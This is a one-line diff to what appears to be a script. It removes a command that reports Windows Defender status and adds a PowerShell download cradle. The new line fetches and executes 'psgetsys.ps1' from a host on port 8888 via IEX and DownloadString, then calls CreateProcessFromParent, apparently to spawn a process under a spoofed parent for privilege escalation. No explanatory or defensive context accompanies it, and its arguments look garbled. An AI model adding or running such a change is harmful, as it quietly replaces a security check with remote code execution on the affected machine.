@@ -1,1 +1,1 @@
-echo "===============Windows_Defender_Status===============";Get-MpComputerStatus
+IEX (New-Object Net.WebClient).DownloadString('http://eth0:8888/psgetsys.ps1');[MyProcess]::CreateProcessFromParent(dbege,'ges','')
